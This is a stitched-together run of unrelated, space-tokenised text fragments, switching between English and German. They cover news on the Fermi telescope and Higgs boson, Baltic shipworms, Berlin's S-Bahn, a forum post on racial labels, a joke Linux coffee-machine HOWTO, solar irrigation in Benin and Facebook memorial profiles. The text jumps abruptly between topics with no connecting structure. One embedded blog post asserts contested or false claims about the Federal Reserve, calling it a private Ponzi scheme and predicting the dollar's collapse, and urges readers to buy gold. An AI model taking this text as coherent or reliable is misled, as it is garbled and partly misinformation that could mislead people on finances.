The NASA Fermi Gamma-ray Space Telescope is at the center of a new hype recently started in the international scientific community .
Some experts believe that the former Gamma-ray Large Area Space Telescope ( GLAST ) , which is especially suited for observing highly energetic photons coming in from pulsars , neutron stars , blazars , quasars , and other such objects , may also be the right tool for observing the elusive Higgs boson .
This is the goal of the largest physics experiment ever constructed on our planet , the CERN - operated Large Hadron Collider ( LHC ) , NewScientist reports .
The Higgs boson would be the fifth one in the Standard Model , the leading and only theory particle physics has at this point of explaining everything around us .
The Higgs , also known to some as the “ God Particle ” is believed to be responsible for making energy acquire mass , and vice - versa .
Detecting it would validate the SM , and would also put astrophysicists and theoretical physicists at rest .
If the Higgs is not found , then the last decades of research have been for nothing , and Science would need to start all over again .
Fermi was launched last year , with the great purpose of finding traces of gamma-rays .
This particular type of radiation is believed to be formed when the WIMP ( weakly interacting massive particles ) that allegedly make up dark matter annihilate each other .
It is hypothesized that , if two massive particles collided ( each with a mass of 50 and 200 gigaelectronvolts GeV ) , then two gamma-ray photons , or a photon and a massive particle would be produced .
Some experts believe that one of those massive particles may in fact be a Higgs boson .
“ If there is a strong connection between the physics of dark matter and the physics of mass generation , those dark matter particles probably like to interact with the Higgs boson , says University of California in Irvine ( UCI ) expert Tim Tait , the leader of a team that developed the idea .
“ FERMI has very good prospects of discovering the Higgs if this model is true , ” the expert adds .
The LHC is still a good two years away before being able to make any claims on the discovery of the Higgs , so there is still time for Fermi to work its magic .
The dreaded wood - eating shipworm is invading northern Europe 's Baltic Sea .
The animal threatens to munch through thousands of Viking vessels and other historic shipwrecks , scientists warn .
The sea's cool , brackish waters have for centuries protected the wrecks from the wormlike mollusks .
But now global warming is making the Baltic Sea ( map ) more comfortable for the critters , a new study speculates .
Shipworms , which can obliterate a wreck in ten years , have already attacked about a hundred sunken vessels dating back to the 13th century in Baltic waters off Germany , Denmark , and Sweden , reported study co-author Christin Appelqvist .
" Since 1990 there has been a big range expansion in the southern Baltic , " said Appelqvist , a marine biologist at the University of Gothenburg in Sweden .
Until recently the wood - boring molluscs , which generally require relatively salty waters , were unable to survive in the low - salt Baltic .
Why shipworms are suddenly able to spread there remains a mystery , but studies suggest rising sea temperatures have something to do with it .
In warmer water the animals , Appelqvist said , appear to be somehow " less stressed " by low salinity .
Global Worming Disaster ?
The shipworm invasion could prove disastrous for marine archaeology in the region , home to long - submerged prehistoric timber settlements and remarkably preserved wrecks such as the salvaged 17th century Swedish warship the Vasa , a major museum attraction in Stockholm .
To defend the region 's well - preserved wrecks from shipworms , researchers have suggested draping submerged vessels in polypropylene covers or covering ships with seabed sediments and sandbags .
Such a project could reach positively oceanic proportions , given that the Baltic holds about a hundred thousand well - preserved shipwrecks — and counting .
" Really nice tall ships with the mast and everything intact are still being discovered , " Appelqvist said .
" Every time [ researchers ] go down there with remotely operated vehicles they find new wrecks . "
Berlin - Die Berliner S- Bahn wird frühestens in drei bis vier Jahren wieder einen normalen Betrieb anbieten können .
Dies hat der Personenvorstand der Bahn AG , Ulrich Homburg , Berlins Stadtentwicklungssenatorin Ingeborg Junge - Reyer ( SPD ) bestätigt .
Sie will nun , wie sie dem Tagesspiegel sagte , „ ruhig , aber zügig “ entscheiden , wie der S - Bahn - Verkehr in Zukunft organisiert sein wird .
Der Vertrag des Senats mit der Bahn läuft Ende 2017 aus .
Weil kein Ende der Einschränkungen absehbar ist , müsse die Bahn ihre Kunden nochmals entschädigen , fordert Junge - Reyer .
Hier bewegt sich der Konzern bisher nicht .
Bereits im nächsten Frühjahr und nicht erst Ende 2011 , wie bisher vorgesehen , soll klar sein , ob der Betrieb für die Zeit nach 2017 ausgeschrieben wird – komplett oder für Teilnetze .
Nach wie vor erwäge der Senat auch , die S - Bahn zu übernehmen , sagte Junge - Reyer .
Angesichts des desolaten Zustandes bei den Fahrzeugen und im Betrieb sei dies aber nur zu einem „ negativen Kaufpreis “ möglich .
Das heißt , der Senat wäre nur bereit , die gesamten Risiken zu übernehmen , wenn die Bahn dem Land dafür auch noch Geld zahlt .
Zuvor hatte schon Finanzsenator Ulrich Nußbaum ( parteilos ) erklärt , die S - Bahn nur zum „ Schnäppchenpreis “ übernehmen zu wollen .
Die Bahn ist dazu derzeit nicht bereit .
Allerdings riskiert sie dann , bei einer Ausschreibung zumindest langfristig den gesamten Auftrag an Konkurrenten verlieren zu können .
Würde der Senat Eigentümer , wäre eine Ausschreibung dagegen hinfällig .

Derzeit wird das Durcheinander im Betrieb fast täglich größer .
Kurzfristig hatte die S - Bahn entschieden , am Montag die Züge wieder nur alle 20 Minuten nach Potsdam fahren zu lassen .
Stattdessen wurden die Fahrten von Erkner über Ostbahnhof hinaus bis Charlottenburg verlängert .
Ein Sprecher begründete dies mit der größeren Nachfrage durch den Einkaufsverkehr auf der Stadtbahn zwischen Ostbahnhof und Charlottenburg .
Allerdings konnte das Unternehmen auch nur weniger Züge einsetzen als noch im Notverkehr vor Weihnachten .
Informationen zu dieser Änderung im Fahrplan waren rar .
Selbst der Verkehrsverbund Berlin- Brandenburg ( VBB ) wurde nicht unterrichtet .
Mit kurzfristigen Änderungen im Fahrplan sei auch weiter zu rechnen , sagte ein Bahnsprecher .
Dieses Verhalten der S - Bahn bezeichnete Junge - Reyer als „ unglaublich “ .
Als Erfolg des bisher ausgeübten Drucks auf die S - Bahn wertet Junge - Reyer die Zusage , die aus Kostengründen geschlossene Werkstatt Friedrichsfelde wieder zu öffnen und Mitarbeiter einzustellen .
Einen Termin dafür gibt es aber noch nicht .
Nach Junge - Reyers Angaben hat die S - Bahn die jahrelang vernachlässigte Wartung der Bremsanlagen an den Fahrzeugen jetzt fast abgearbeitet .
Bestehen blieben aber die Probleme mit den Rädern , die ausgetauscht werden müssen .
Deshalb müssten auch in den nächsten Jahren mehr Züge in die Werkstätten als vorgesehen und fehlten dann im Betrieb .
Die Folge : Auch wenn die S - Bahn zum normalen Fahrplan zurückkehrt , werden viele Züge mit weniger Wagen als vorgesehen unterwegs sein .
Der Senat will dann den Zuschuss kürzen .
Über die Höhe habe man sich aber noch nicht geeinigt , sagte Junge - Reyer .
The question of whether cannabis should be legal has divided New Zealanders for years , but what does the Pacific community think of the bill ?
The National Academy of Sciences is to honor NCSE 's executive director Eugenie C. Scott with its most prestigious award , the Public Welfare Medal .
According to a January 11 , 2010 , press release , " the medal is presented annually to honor extraordinary use of science for the public good " ; Scott was chosen " for championing the teaching of evolution in the United States and for providing leadership to the National Center for Science Education . "
She will receive the award on April 25 , 2010 , during the Academy 's 147th annual meeting .
The president of the National Academy of Sciences , Ralph J. Cicerone , commented , " Eugenie Scott has worked tirelessly and very effectively to improve public understanding of both the nature of science and the science of evolution , " and the chair of the Public Welfare Medal selection committee , John Brauman , added , " We honor her for many years of organizing coalitions of scientists , parents , teachers , business people , clergy , and others to defend the teaching of evolution . "
" I am profoundly honored by the National Academy 's choice of me to receive the Public Welfare Medal , " Scott said .
" Really , it honors not just my work , and not just the work of the National Center for Science Education .
Rather , it honors the work of a host of dedicated , thoughtful , and passionate people who have labored in defense of the teaching of evolution in the public schools .
I have been privileged to work with them over the years , and I am proud to accept the award on their behalf . "
Previous recipients of the medal include Neal Lane , Norman Borlaug , William T. Golden , Maxine F. Singer , C. Everett Koop , and Carl Sagan .
The National Academy of Sciences is a private , nonprofit institution that was established under a congressional charter signed by President Abraham Lincoln in 1863 .
It recognizes achievement in science by election to membership , and provides science , technology , and health policy advice to the federal government and other organizations .
NASA continues to stay ahead of the government pack when it comes to public outreach .
In addition to its many popular Twitter streams , iPhone apps and opportunities for citizens to participate in scientific programs , the agency is jumping into the e-book space .
For space geeks looking for a little e-reading this weekend , NASA recently added an e-book section to its publications list and rolled out the first free title for the Kindle and Sony Reader , a history of the x -15 hypersonic test aircraft .
More titles are on the way .
The agency already has plenty of technical papers , presentations , case studies and other publications on its website that could eventually land in your e-reader .
NASA says it will eventually make titles available for the Nook as well .
And Luddites can still order hard copies of the X - 15 book , along with a CD or a PDF .
No word on whether NASA will put together a version for devices like the iPad that could integrate text , photos and video into the kind of publication many are hoping will be the next generation of books .

No , the headline is not a misprint .
According to CNBC , the Federal Reserve bought approximately 80 percent of the U.S. Treasury securities issued in 2009 .
In other words , the Federal Reserve has been gobbling up the massive tsunami of U.S. government debt that has been created over the past year .
This is absolutely unprecedented , and it is yet another clear indication that the U.S. financial system is on the verge of a major economic collapse .
You see , the Federal Reserve is not part of the federal government .
In fact , the Federal Reserve is about as “ federal ” as Federal Express is .
The Federal Reserve is a private bank owned and operated for profit by a very powerful group of elite international bankers .
It is this private central bank that controls the money supply and the issuance of currency in the United States .
When the U.S. government needs to borrow more money ( which happens a lot ) they go over to the Federal Reserve and they ask them for some more green pieces of paper called Federal Reserve Notes .
The Federal Reserve swaps these green pieces of paper for pink pieces of paper called U.S. Treasury bonds .
Now normally the Federal Reserve takes these U.S. Treasury bonds and they sell them all to other buyers .
But in 2009 there were not nearly enough buyers .
So in 2009 the Federal Reserve sold itself about 80 percent of this debt .
This is even being admitted on CNBC .
The video below is from January 8th , and at the 1:45 mark CNBC anchor Erin Burnett drops this bombshell along with a comment about how it is a Ponzi scheme … .
So why is it a Ponzi scheme ?
Well , basically the Federal Reserve is creating money out of nothing , loaning it to the U.S. government and then collecting interest on the loan .
That is nice work if you can get it .
But also , this intervention by the Federal Reserve is keeping interest rates on U.S. Treasury bonds artificially low .
In a true “ free market ” situation , the interest rates on U.S. treasuries would rise to reflect the rapidly declining economic situation in this nation .
Due to the massive explosion in the size of the U.S. government debt and due to the very weak U.S. economy , interest rates on U.S. treasuries should have shot through the roof by now .
Rational investors would normally require an increased return for the increased risk that U.S. treasuries now represent .
But that is not happening .
Instead when there are no buyers for U.S. treasuries at current interest rates , the Federal Reserve just steps in and buys up all the excess bonds that need to be purchased .
But in a normal free market situation , interest rates would rise on U.S. treasuries until they would be attractive enough for investors to buy them all .
However , that would create some huge problems .
If the U.S. government was not able to borrow all of the money it wanted to at artificially low interest rates , the results would be absolutely disastrous .
Much higher interest rates on U.S. government debt would cause the U.S. federal budget deficit to absolutely explode .
Interest rates on everything else throughout the economy would also skyrocket .
As mortgage rates climbed dramatically , the housing market would completely collapse .
The U.S. economy would be totally in flames .
But for now ( and this situation cannot last forever ) the Federal Reserve is keeping interest rates artificially low by lending the U.S. government as much money as it wants at extremely low interest rates .
Of course the Federal Reserve is making an insane amount of money out of the arrangement , so it is working out quite nicely for them as well .
But by essentially “ printing ” a flood of cheap money for the U.S. government to borrow , the Federal Reserve is ultimately going to end up destroying the value of the U.S. dollar .
Every fiat currency throughout history has always ended up losing its value , and that is exactly what is going to happen this time too .
The only way to protect the buying power of your money is to put it into something that will hold value ( like gold or silver ) .
Your dollars are never going to be worth more than they are today .
The actions taken by the U.S. government and the Federal Reserve have guaranteed the demise of the U.S. dollar .
At this point it is unavoidable .
It is only a matter of how soon it will happen and how bad it will be as things play out .
You better get ready .
I mean to think about it we are not from africa even though we do have ancestor from africa ..
But who does n't ?
Most of black people are n't even fully african .. we have at least 5 or 6 % white / other ..
Some blacks do n't even have the common african features ..
Africa is also not fully african it has Egyptian there too .
Im mean am i the only black person that gets pissed off when people call you african american ?
I mean i never even been to africa ..
I think they should separate black froms african american .
Like they do whites from europeans ..
And keep african or anyone from africa called african americans .
Does anyone else ( Black mostly ) or anyone else agree ?

The Beyond and below are like a deep of ocean , and we the creatures that swim in the abyss .
We 're so far down that the beings on the surface — superior though they are — can't effectively reach us .
Oh , they fish , and they sometimes blight the upper levels with points we do n't even understand .
But the abyss remains a relatively safe place .

The proposal noticeably points out that helicopters are " limited in flight speed and availability . "
Combat helicopters do n't move like combat jets , but it's hard to imagine a flying car that 's going to move any faster .
One could also point out that if availability of helicopters is an issue , perhaps we should n't be throwing money after vertically - launched flying cars .
But what 's good for the military often ends up being good for civilians as military technology bleeds into commercial use , so we 're the last ones who will criticize DARPA for this one .

Coffee Making
Fotis Georgatos < gef@ceid.upatras.gr >
For a long time humanity has been wondering how could a computer make coffee ...
People need coffee to wake up , and stay awake for a long time in front of the computer .
It is common wisdom that coding is better at night !
The main trick is interfacing a coffee machine to the computer , so that it can be controlled by software .
This HOWTO will show you how to do so .
At first , it demonstrates an ON / OFF switch implemented as an electronic circuit which controls the coffee - machine 's power supply .
Another chapter will tell you the secrets of building intelligent , Turing Complete suitable , coffee machines !
This HOWTO was initially written as part of a debate in the mailing list linux - greek - users , on whether linux can make coffee or not .
It then became an article in our online magazine called magaz .
Just in case you wondered , magaz is in Greek and it will surely look like that to you !
Enjoy .

It is about time for everyone to know that Coffee Making is just one of the standard features that come for free with * any * Linux distribution .
Or , does SCO have a patent on that , too ?
Gee ...

Coffee was popular in the Middle East for ages , until a failed invasion of the Turks at the city of Vienna at 1683 left behind sacks with strange brown beans nobody wanted : http://www.vienna.cc/ekaffeeh.htm/.
Kostas Lialiambis is the one who dared claim he can't make coffee with his Linux box , back then in year 1997 .
Panagiotis Vrionis et al for giving me interesting and humorous notes and let the ball roll in the early days .
NUMEROUS people on the internet with additions and remarks .
Thank you all , really !
Even though I might have not replied to your email .
Well , to the best of my knowledge , this is a dope - free work .
But , I can tell you the secret of the music playing on the background : nearly any song spelled by Zampetas or Mpithikotsis ( bouzouki and such ) .
For your online commentary of your own DIY Coffee Machine steer at http://coffee.sf.net/.
If you still have comments to say , emails get lost these days , so why not send me a postcard with a picture from your great hometown , adding a recommendation of your favourite cafe ' in the area ?

PS .
Your suggestions wo n't be wasted , I really tend to travel quite a lot these days and might be around before your realize it .
Yes , I have been in Amsterdam and even lived there for three years ; coffee shops generally do n't account as cafe's !
Surprise : I actually prefer chocolate and tea over coffee . ;-)
Popular coffee among programmers because it does n't need a lot of care and its cooking is streamlined ; just like commercial software .
Its exciting taste has inspired thousands of programmers in writing incredible software , written in the very first hours of a day .
M$ Windows for example has been written at 5:00 o'clock in the morning , only thanks to coffee !
A similar result is guaranteed .
Nescafe is a rather strong coffee , made by pouring hot water in a mixture of coffee , sugar and some water .
You usually take 1 spoon of coffee and 1 spoon of sugar with just a bit of water , to mix it .
In the meantime you should have the water boiling .
As soon as the water is hot enough , you mix them all together and preferably add condensed milk .
Although you could use something simpler than a coffee - machine to boil the water , I have seen this done so several times ...
A popular variation of the above mentioned coffee .
Actually , you do n't need a sophisticated coffee - machine , rather a refrigerator for cold water and ice - cubes .
It is very popular in South Eastern Europe during the warm summer months .
This is a complicated one , read coffee - faq ( read further information )
Espresso is a very strong , italian sort of coffee .
You serve it in small cups ( You ask why ?
See chapter : Overdose Symptomes ) with one or two pieces of lump sugar .
To produce a good espresso you need fresh grinded coffee beans , water , lump sugar and a special machine .
These machines boil the water and press the very hot steam through the grinded coffee beans .
You can buy a super - duper - automatic machine for a lot of money .
But a low cost machine is usable , too .
OK . , lets start .
Fill water in your machine .
Let it become hot .
In the meantime fill about 1 teespoon of coffeepowder in the filterhandle of your machine .
Press the coffeepowder down .
Not too much .
Now the water is at the right temperature .
Attach the filterhandle to the machine and let the machine work .
After about 30 seconds you can serve a delicate , hot espresso .
It is fine after a good meal .
You feel good and can code for a few more hours .
( See also chapter : Espresso )
If you have a more profi-like machine , you can use it , to froth milk with it .
You need this feature to make a creamy sort of coffee .
It is easy to prepare .
Put some frothed milk in a coffee pot and fill it up with espresso .
Then decorade with some chocolade flakes .
That 's it .
A generic diagram could look like this :
--------- 0-5V --------- ~220V ---------------- | PC |====>====|Circuit|==========|Coffee-Machine|
---------
--------- ----------------
The concept is that we take a controling voltage from the computer , which drives an electrically isolated circuit with a Relay or Triac .
You must choose a Relay circuit , if you have a coffee - machine greater than 200W .
You can use a triac - based one if your coffee machine is n't high power .
All circuits presented are tested , but the results and risks are YOUR OWN RESPONSIBILITY .
If you have no experience with electronics you should NOT try building it on these , otherwise you may get a bad one ...
You should be very careful while experimenting with 220V , and using an appropriate fuse is absolutely advisable .
Here is a simple example to get a voltage 0 - 5V from the parallel port of the computer .

Pin 1 is Strobe ( inverse logic )
Pins 2 - 9 is DATA BUS 's signals , exactly what was written to the parallel port 's latches with an OUTB command .
Pin 10 is the acknowledge signal ( ACK ) , controlled by you , so that you can produce an interrupt to the CPU .
Pins 18 - 25 are short - circuited and this is the ground ( GND ) .

The straight - forward circuit one can build is :
Vcc | +------+ | __|__ Relay /^\ Diode 1N4002 Coil /---\ | | +------+ | | / 4.7K B |/ C parallel port >-\/\/\/\/---|
NPN Transistor : BC547A or 2N2222A data pi |\ E | \ V parallel port >--------------+ ground pin | Ground
Barmen , tend to put the relay AFTER the transistor , at the emitter ( E ) pin instead of the collector ( C ) pin .
This is bad practice because it biases the transistor badly , and might result in bad coffee :-) .
Diode 1N4002 is useful to protect the transistor from the relay 's currents .
If you do n't use it the transistor will sooner become dark and smelly ...
If you only want a simple circuit , you can use Motorola 's triac driver MOC301 [ 012 ] , together with a general purpose TRIAC like SC141D .
This method has the advantage that you do n't need any extra power supply .
For non-inductive loads , this is the circuitry :

If you are going to work with 220V , try to obtain a 3021 .
Inductive loads should be used in conjuction with bypass capacitors , better consult Motorola Application Note AN - 780 .
Coffee - machines are mainly resistive loads and not inductive ( like a motor ) , but who knows what yours is ?

This design is for 120V .
You should change resistors accordingly for 220V .
Circuit description :
The MC3032 is an optoisolator TRIAC driver .
The 180 - ohm resistor sets the current for the LED emitter in the optoisolator .
Change the value of this resistor - if necessary - to get a reasonable current ( e.g. , 15 mA ) .
Note that you cannot test this circuit without a load .
The TRIAC will not switch unless connected to an AC voltage source , so you can't test it for simple switching without applying AC and a load .
Note the 500V rating on the .01 capacitor .
You will have to build an executable that will take the following steps :
Get permission to use I/ O address space , by calling kernel , with the call ioperm : eg ioperm ( BASE , range , 1 ) ;
: eg ioperm ( BASE , range ,1 ) ; Perform an out request instruction , to set the 0 - 5V voltage to the parallel port , eg outb ( 1 , BASE ) ;
Wait enough time so the coffee is made .
It would be nice if that time is read by looking at the command line .
Then it will turn off the coffee - machine : outb ( 0 , BASE ) ;
Before ending it should give back the parallel port with an ioperm ( BASE , range , 0 ) ;
It would be useful if you had that program setuid , so that everybody can drink coffee !
You BOFH !
Just read kernel hacker 's guide , to implement a device driver ; you might also do it in user space .
Please compile it as a module , so that we wo n't need a kernel compile in every update .
Then write :
echo cappuccino >/dev/coffee
And you will have a hot cup of coffee in minutes !
Remember to give the right permissions to / dev / coffee , depending on whether you want only root making coffee or not .
The advantage of this method is that it supports feedback from the coffee - machine by using the ACK of parallel port and such , so that smart coffee - machines can produce an interrupt when ready .
Do it yourself , after reading the excellent book of Alessandro Rubini and Jonathan Corbet Linux Device Drivers and studying the Cross Reference Linux source code repository .
If you have implemented the controlling program in C ( see above ) , you just have to write a CGI script to turn ON and OFF the coffee - machine or pass along more complex instructions .
You should write some nice webpages , explaining how to make coffee , and put them on an apache web server ...
...LAMP technology ( Linux , Apache , MySQL , [ Perl|Python|PHP ] ) , will help you to build a perfect user - customizable coffee system !
At some time in the future when the applications get rather complex , you might want to extend on the basis of Flow - Based Programming : http://www.jpaulmorrison.com/fbp/.
What a great match for a great Coffee Machine !
Do you pine for the nice old days , when men were men and build their own coffee machines ?
This chapter is about assembling a smart , intelligent ! , coffee machine .
It will be a computer designed with a von Neumann architecture , comprised of a CPU , ROM / RAM and I/O and will also be suitable for generic use , a.k.a. Universal Turing Machine .
Unlike other complex , but popular , systems that are either CISC or RISC , our machinery will be MISC : Mono -Instruction Set Computer !
Alas , our processor will understand just one command and yet , given enough memory and time , it is able to perform any action that your 3GHz Pentium IV could do , or just simulate it alltogether ;
It can solve any computable problem by running simple code like this :
SBN $ mem1 , $ addr1 SBN $ mem2 , $ addr2 SBN $ mem3 , $ addr3 SBN $ mem4 , $ addr4 SBN $ mem5 , $ addr5 SBN $ mem6 , $ addr6 [...]
The magic command is called SBN $ mem , $ addr ( Subtract and Branch if Negative ) , and does take the value of a memory cell $ mem , subtract it from the accumulator ( A is the only available register in this architecture ) and store it back to the accumulator and memory $ mem : [ mem ] <= A <= A - [ mem ] .
If the result is negative , and only then , it jumps to the designated address $ addr .
If $addr points to the next command , there is no conditional jump .
Now , with that command at hand you can subtract , add , zero memory addresses , move bytes around , multiply , compare and so on , so forth .
What 's best of all , you can easily build an optimizing compiler .
Voila .
This is a great system for any Turing Complete problems plus , it is even simpler in coding than the original Turing Machine !
The great thing with this innovative MISC processor is that you need 0 bits to store the opcode of your commands .
This makes your CPU much , much simpler : you only have to read a couple of operands each time .
You might wish to extend the capabilities of your processor by extending the SBN instruction to 3 or 4 operands , so that it can directly load and store data from main memory .
This is an exercise left to the reader ; kudos to google .
The CPU diagram looks like this :
<========= ADDRESS BUS ==============> = = = +---------+ = = | CONTROL | = +---------+
+-----------------+
| ALU & A | | Program Counter | +---------+
+-----------------+ = | LOGIC | = = +---------+ = = = <=========== DATA BUS ===============>
Now , all you have to do is just hook together some memory chips , for example by recycling static cache RAM from old 386 PCs , an ALU and a few glue components .
You may pick one of TTL or CMOS for logic gates and latches ; I 'm a CMOS guy , but this really depends on your favourite flavor .
You may build an 8 , 16 , 32 , 64 bit or whatever width system you need .
Just in case , for larger word widths , I have found preferable building the ALU with pre-programmed 27128 EPROMS instead of the harder - to - find 74x181s .
Look around for a carry propagation unit , too .
The monolithic nature of this system allows only memory - mapped I/O , and requires special design provisions for bidirectional interfacing , but nothing more peculiar than what is seen in older - generation systems .
AGC , the computer that drove Apollo 11 mission to the moon was making use of such techniques , so it should be sufficient in this case , too .
Note that the data bus has to be exactly as wide as the address bus , that implies that the notion of a byte is only applicable to 8 bit coffee machines , which you will eventually find that it is more of a feature than a bug .
You will be surprised with what a coffee you can have for 8 or 16 bits bus !
It is really a general - purpose piece of hardware , built for peanuts .
Such a pure system will make a good fit together with the , famous for embedded systems controlling , FORTH programming language .
The major prerequisite for doing so is to have a stack mechanism , which in this case can be constructed by a counter combined together with a memory pool .
If you want to claim a serious coffee development platform , C portability is an absolute must nowadays .
Your choices might be hacking one of gcc , lcc or sdcc , which with proper tweaking at the back - ends will be able to spit out the specially crafted MISC assembly code .
One day you might even want to rewrite another language like C , forget the D letter - it is taken already , so do not make again the same mistakes with your compiler please :
http://www.gnu.org/software/gcc/projects/beginner.html
Just in case you thought of writing your own compiler , please read in advance about flex , yacc and just a little bit of related theory .
In particular you will quickly appreciate Noam Chomsky 's taxonomy on languages :
regular grammars ( the abstract formalism for regular expressions ) ,
context free grammars ( any BNF - described language is such )
Because of the way a Turing Machine works ( see for that http://plato.stanford.edu/entries/turing-machine/ ) , it is a very complicated device to program , and debug at the end of the day .
The reason is , that its behavior is a sequential process that is completely determined by the following parameters :
( 1 ) the State the machine is in ,
( 2 ) the Symbol ( or number ) on the square it is scanning , and
(3) a Table of Instructions
The major contemporary disadvantage of the Turing Machine ( TM ) is that it is of sequential nature , which implies that only a particular range of problems can be mapped to it in a straightforward way .
TMs are suitable for problems that are described well on a serial storage medium ( tapes ) and do n't make use of indexes for data reference .
This is in contrast to the Coffee Machine ( CM ) that can handle any Random Access algorithms as well ( with no compromise of simplicity ) .
Add to this , that TMs impose a very high and unnecessary complexity on item ( 3 ) in favor of keeping ( 1 ) and ( 2 ) simple .
And just in case you do n't agree that the so called Table of Instructions gets trully overwhelmed , have you ever tried to write a compiler for a Turing Machine ?
A system that is n't easily programmable and is hard to debug , should be considered a seriously questionable system , at least as far as Computer Engineering (!= CS ) is concerned .
For instance , try to simulate the Coffee Machine with a Turing Machine and vice versa .
Hey , if you still disagree , show me the code .
Bottom Line : The Coffee Machine ( CM ) , is a much better model for the von Neumann architecture and has a O ( 1 ) relationship with what is standard practice of weighting algorithms , in the current form of complexity theory .

Voting for the first Letters.app project president has wrapped up and John Gruber has given the honor of steering the project towards a 1.0 release .
As president , Gruber has committed to lead by his gut , stay out of code or engineering details , but direct a group of focused people to produce a new kind of mail client : simple , correct , extensible .
John Gruber was relatively reserved on the list until the compaign letters were released .
He jumped into the candidate Q&A session quickly , however , with quick , true - to - character responses .
Gruber ’s keen eye for detail and acute sense of taste should serve the project well into its first release .
In the coming days , Gruber ’s A - Team should emerge .
In addition to all of the election a Letters.app , a Github repository and wiki have been set up as well .
Letters.app will be far from a full featured , every - man ’s email client .
Ornamental features like HTML message composition have almost been universally decried on the mailing list , and there is a strong consensus around doing a few things well and exposing hooks to allow plugins to do the rest .
From the start Letters.app was proposed to be the client that power users have wanted : the good parts of Mail.app with none of the crap .
Solar - powered drip irrigation systems significantly enhance household incomes and nutritional intake of villagers in arid sub-Saharan Africa , according to a new Stanford University study published in the Proceedings of the National Academy of Sciences ( PNAS ) .
The two - year study found that solar - powered pumps installed in remote villages in the West African nation of Benin were a cost - effective way of delivering much - needed irrigation water , particularly during the long dry season .
" Significant fractions of sub-Saharan Africa 's population are considered food insecure , " wrote lead author Jennifer Burney , a postdoctoral scholar with the Program on Food Security and the Environment and the Department of Environmental Earth System Science at Stanford .
" Across the region , these food - insecure populations are predominantly rural , they frequently survive on less than $ 1 per person per day , and whereas most are engaged in agricultural production as their main livelihood , they still spend 50 to 80 percent of their income on food , and are often net consumers of food . "
Burney and her co-authors noted that only 4 percent of cropland in sub-Saharan Africa is irrigated , and that most rural , food - insecure communities in the region rely on rain - fed agriculture , which , in places like Benin , is limited to a three - to six - month rainy season .
" On top of potential annual caloric shortages , households face two seasonal challenges :
They must stretch their stores of staples to the next harvest ( or purchase additional food , often at higher prices ) , and access to micronutrients via home production or purchase diminishes or disappears during the dry season , " the authors wrote .
Promotion of irrigation among small landholders is therefore frequently cited as a strategy for poverty reduction , climate adaptation and promotion of food security , they said .
And while the role of irrigation in poverty reduction has been studied extensively in Asia , relatively little has been written about the poverty and food security impacts in sub-Saharan Africa .
Benin demonstration sites
To address the lack of data , Burney and her colleagues monitored three 0.5 - hectare ( 1.24 - acre ) solar - powered drip irrigation systems installed the Kalalé district of northern Benin .
The systems , which use photovoltaic pumps to deliver groundwater , were financed and installed by the Solar Electric Light Fund ( SELF ) , a nongovernmental organization .
advertisement
" As with any water pump , solar - powered pumps save labor in rural off - grid areas where water hauling is traditionally done by hand by women and young girls , " the authors said .
" Though photovoltaic systems are often dismissed out - of - hand due to high up - front costs , they have long lifetimes , and in the medium - term , cost less than liquid - fuel - based pumping systems . "
Solar - powered pumps also can be implemented in an easily maintained , battery - free configuration , they added , " thereby avoiding one of the major pitfalls of photovoltaic use in the developing world . "
In November 2007 , the research team began a close collaboration with local women 's agricultural groups in two villages in rural Benin .
In Village A , which draws surface water from a year - round stream , researchers worked with residents to install two identical solar - powered pumping systems .
In Village B , which relies on groundwater irrigation , water was pumped from 25 meters ( 82 feet ) below the surface .
Each solar - powered pumping system was used by 30 to 35 women affiliated with an agricultural group .
Each woman farmed her own 120 - square meter ( 1,292 - square foot ) plot .
The remaining plots were farmed collectively to fund group purchases and expenses .
The researchers also chose two control villages for comparison with Villages A and B. Women 's agricultural groups in the control villages continued to irrigate by hand , allowing for comparison of the solar - powered drip irrigation systems to traditional methods .
" Household surveys were conducted in both treatment and control villages upon installation ( November 2007 ) and following one year of garden operation ( November 2008 ) , and included detailed questions concerning consumption and agricultural production , as well as other socioeconomic , health and general questions , " the authors wrote .
Striking results
The results were striking .
The three solar - powered irrigation systems supplied on average 1.9 metric tons of produce per month , including tomatoes , okra , peppers , eggplants , carrots and other greens , the authors found .
Woman who used solar - powered irrigation became strong net producers in vegetables with extra income earned from sales -- significantly increasing their purchases of staples and protein during the dry season , and oil during the rainy season .
During the first year of operation , the women farmers kept an average of 18 percent by weight -- 8.8 kilograms ( 19.4 pounds ) per month -- of the produce grown with the solar - powered systems for home consumption and sold the rest in local markets .
advertisement
" Garden products penetrated local markets significantly , " the authors found .
" Vegetable consumption increased during the rainy season ( the time of greatest surplus for the women 's group farmers ) for the entire four - village sample of households . "
Survey respondents also were asked about their ability to meet their household food needs .
Seventeen percent of the project beneficiaries said they were " less likely to feel chronically food - insecure .
In short , the photovoltaic drip irrigation systems had a remarkable effect on both year - round and seasonal food access , " the authors said .
Nutrition and sustainability
In terms of nutrition , vegetable intake across all villages increased by about 150 grams per person per day during the rainy season .
But in villages irrigated with solar - powered systems , the increase was 500 to 750 grams per person per day , which is equivalent to 3 to 5 servings of vegetables per day -- the same as the U.S. Department of Agriculture 's Recommended Daily Allowance for vegetables -- and most of this change took place in the dry season .
The research team also concluded that , despite higher up - front costs , using solar power to pump water can be more economically sustainable in the long run than irrigation systems that run on liquid fuels , such as gasoline , diesel or kerosene .
" When considering the energy requirements for expanded irrigation in rural Africa , photovoltaic drip irrigation systems have an additional advantage over liquid - fuel - based systems in that they provide emissions - free pumping power , " they added .
" Overall , this study thus indicates that solar - powered drip irrigation can provide substantial economic , nutritional and environmental benefits , " the authors said .
" With the proper support , successful widespread adoption of photovoltaic drip irrigation systems could be an important source of poverty alleviation and food security in the marginal environments common to sub-Saharan Africa . "

The research was supported by an Environmental Venture Projects grant from the Woods Institute for the Environment at Stanford University .
The results are published in the Jan. 4 , 2010 , online edition of PNAS .
Facebook is to give people the option to " memorialise " the profile pages of friends and relatives who have died .
The site invited family members to report when one of its users had died , to enable it to remove sensitive information such as updates and contacts .
It has received complaints from users who have received reminders about dead friends or relatives through its " suggestions " feature , which is intended to help users find other people they might know .
" We understand how difficult it can be for people to be reminded of those who are no longer with them , which is why it 's important when someone passes away that their friends or family contact Facebook to request that a profile be memorialised , " wrote Max Kelly , Facebook 's head of security .
The site will require proof of death , in the form of an obituary or newspaper cutting .
Once the profile has been transformed into a tribute page , only confirmed friends will be able to find and see it .
The site will also prevent anyone from logging into the page , but will let friends and family leave remembrance posts on the message wall .
The idea for memorialising users profile pages came after Kelly 's best friend , a fellow Facebook employee , died in a motorbike accident .
" As time passes , the sting of losing someone you care about also fades but it never goes away , " Kelly wrote .
" I still visit my friend 's memorialised profile to remember the good times we had and share them with our mutual friends . "
